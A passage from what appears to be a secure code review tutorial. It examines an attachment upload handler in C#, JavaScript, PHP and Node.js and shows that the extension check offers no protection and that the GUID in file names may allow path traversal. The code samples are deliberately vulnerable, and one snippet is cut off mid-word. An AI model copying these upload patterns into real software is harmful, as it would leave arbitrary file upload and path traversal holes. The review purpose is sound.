            if (!exists(directoryPath)) {
                createDirectory(directoryPath);
            }

            //...
            lock(attachments, () => {
                let list = attachmentsMap.get(attachguid);
                if (list) {
                    if (!list.find(x => x.size === attachmentInfo.size &&
                                        x.contentType === attachmentInfo.contentType &&
                                        x.actualFileName === attachmentInfo.actualFileName)) {
                        attachmentInfo.generatedFileName = generateFileName(attachguid, list.length, text); // [4]
                        attachmentInfo.generatedFileNameAndLocation = generateFileNameAndLocation(directoryPath, attachmentInfo.generatedFileName); // [5]
                        list.push(attachmentInfo);
                    }
                } else {
                    attachmentInfo.generatedFileName = generateFileName(attachguid, 0, text); // [6]
                    attachmentInfo.generatedFileNameAndLocation = generateFileNameAndLocation(directoryPath, attachmentInfo.generatedFileName); // [7]
                    //...
                }
            });

            if (attachmentInfo.generatedFileName && attachmentInfo.generatedFileName.length > 0) {
                await copyStream(file.stream, attachmentInfo.generatedFileNameAndLocation); // [8]
                //...
            }
        //...
        }
    } catch (e) { }
}

```
{% endtab %}

{% tab title="PHP" %}
```php
public static function saveAttachment($webHostEnvironment, $httpAbsoluteRootPath, $currentUser, $file, $guid, $contentId = "")
{
    //...
    try {
        if ($file !== null && strlen($file->stream) > 0) {
            $sanitizedName = sanitizeFilename($file->fileName); // [1]
            $text = findExtension($sanitizedName); // [2]
            $directoryPath = baseDirectory . DIRECTORY_SEPARATOR . "App_Data" . DIRECTORY_SEPARATOR . "Attachments"; // [3]

            if (!file_exists($directoryPath)) {
                mkdir($directoryPath, 0777, true);
            }

            //...
            lock($attachments, function() use (&$attachmentInfo, &$attachmentsMap, $attachguid, $text, $directoryPath) {
                $list = $attachmentsMap[$attachguid] ?? null;
                if ($list !== null) {
                    $found = false;
                    foreach ($list as $x) {
                        if ($x->size === $attachmentInfo->size &&
                            $x->contentType === $attachmentInfo->contentType &&
                            $x->actualFileName === $attachmentInfo->actualFileName) {
                            $found = true;
                            break;
                        }
                    }
                    if (!$found) {
                        $attachmentInfo->generatedFileName = generateFileName($attachguid, count($list), $text); // [4]
                        $attachmentInfo->generatedFileNameAndLocation = generateFileNameAndLocation($directoryPath, $attachmentInfo->generatedFileName); // [5]
                        $list[] = $attachmentInfo;
                    }
                } else {
                    $attachmentInfo->generatedFileName = generateFileName($attachguid, 0, $text); // [6]
                    $attachmentInfo->generatedFileNameAndLocation = generateFileNameAndLocation($directoryPath, $attachmentInfo->generatedFileName); // [7]
                    //...
                }
            });

            if (!empty($attachmentInfo->generatedFileName)) {
                $fileStream = fopen($attachmentInfo->generatedFileNameAndLocation, 'w');
                fwrite($fileStream, $file->stream); // [8]
                fclose($fileStream);
                //...
            }
        //...
        }
    } catch (Exception $e) { }
}

```
{% endtab %}

{% tab title="Node Js" %}
```js
async function saveAttachment(_webHostEnvironment, httpAbsoluteRootPath, currentUser, file, guid, contentId = "") {
    //...
    try {
        if (file != null && file.stream.length > 0) {
            const sanitizedName = sanitizeFilename(file.fileName); // [1]
            const text = findExtension(sanitizedName); // [2]
            const directoryPath = path.join(baseDirectory, "App_Data", "Attachments"); // [3]

            if (!fs.existsSync(directoryPath)) {
                fs.mkdirSync(directoryPath, { recursive: true });
            }

            //...
            await lock(attachments, async () => {
                let list = attachmentsMap.get(attachguid);
                if (list) {
                    if (!list.find(x => x.size === attachmentInfo.size &&
                                        x.contentType === attachmentInfo.contentType &&
                                        x.actualFileName === attachmentInfo.actualFileName)) {
                        attachmentInfo.generatedFileName = generateFileName(attachguid, list.length, text); // [4]
                        attachmentInfo.generatedFileNameAndLocation = generateFileNameAndLocation(directoryPath, attachmentInfo.generatedFileName); // [5]
                        list.push(attachmentInfo);
                    }
                } else {
                    attachmentInfo.generatedFileName = generateFileName(attachguid, 0, text); // [6]
                    attachmentInfo.generatedFileNameAndLocation = generateFileNameAndLocation(directoryPath, attachmentInfo.generatedFileName); // [7]
                    //...
                }
            });

            if (attachmentInfo.generatedFileName && attachmentInfo.generatedFileName.length > 0) {
                const fileStream = fs.createWriteStream(attachmentInfo.generatedFileNameAndLocation);
                file.stream.pipe(fileStream); // [8]
                //...
            }
        //...
        }
    } catch (e) { }
}

```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Examine the function that checks the uploaded file type carefully to see whether it has any protections or not

{% tabs %}
{% tab title="C#" %}
```csharp
private static string FindExtension(string fileName)
		{
			if (fileName == null || fileName.Length < 1 || !fileName.Contains("."))
			{
				return "";
			}
			string[] array = fileName.Split('.', StringSplitOptions.None);
			return array[array.Length - 1];
```
{% endtab %}

{% tab title="JavaScript" %}
```javascript
function findExtension(fileName) {
    if (!fileName || fileName.length < 1 || !fileName.includes('.')) {
        return "";
    }
    const array = fileName.split('.');
    return array[array.length - 1];
}
```
{% endtab %}

{% tab title="PHP" %}
```php
private static function findExtension($fileName) {
    if ($fileName === null || strlen($fileName) < 1 || strpos($fileName, ".") === false) {
        return "";
    }
    $array = explode('.', $fileName);
    return $array[count($array) - 1];
}

```
{% endtab %}

{% tab title="Node Js" %}
```js
function findExtension(fileName) {
    if (!fileName || fileName.length < 1 || !fileName.includes('.')) {
        return "";
    }
    const array = fileName.split('.');
    return array[array.length - 1];
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Then review how the filename is processed, because even if the filename is filtered and validated, a GUID may still allow a **Path Traversal** vulnerability, like in the code below

{% tabs %}
{% tab title="C#" %}
```csharp
private static string GenerateFileName(string attachguid, int count, string extension)
	{
		if (extension != null && extension.Length > 0)
		{
			return string.Format("att_{0}_{1}.{2}", AttachmentsHelper.<GenerateFileName>g__CleanGuid|20_0(attachguid), count, extension);
		}
		return string.Format("att_{0}_{1}", AttachmentsHelper.<GenerateFileName>g__CleanGuid|20_0(attachguid), count);
	}
```
{% endtab %}

{% tab title="JavaScript" %}
```javascript
function generateFileName(attachguid, count, extension) {
    if (extension && extension.length > 0) {
        return `att_${cleanGuid(attachguid)}_${count}.${extension}`;
    }
    return `att_${cleanGuid(attachguid)}_${count}`;
}
```
{% endtab %}

{% tab title="PHP" %}
```php
private static function generateFileName($attachguid, $count, $extension) {
    if ($extension !== null && strlen($extension) > 0) {
        return "att_" . cleanGuid($attachguid) . "_" . $count . "." . $extension;
    }
    return "att_" . cleanGuid($attachguid) . "_" . $count;
}
```
{% endtab %}

{% tab title="Node Js" %}
```js
function generateFileName(attachguid, count, extension) {
    if (extension && extension.length > 0) {
        return `att_${cleanGuid(attachguid)}_${count}.${extension}`;
    }
    re
```
{% endtab %}
{% endtabs %}
{% endstep %}
{% endstepper %}

***

#### sss

## Cheat Sheet
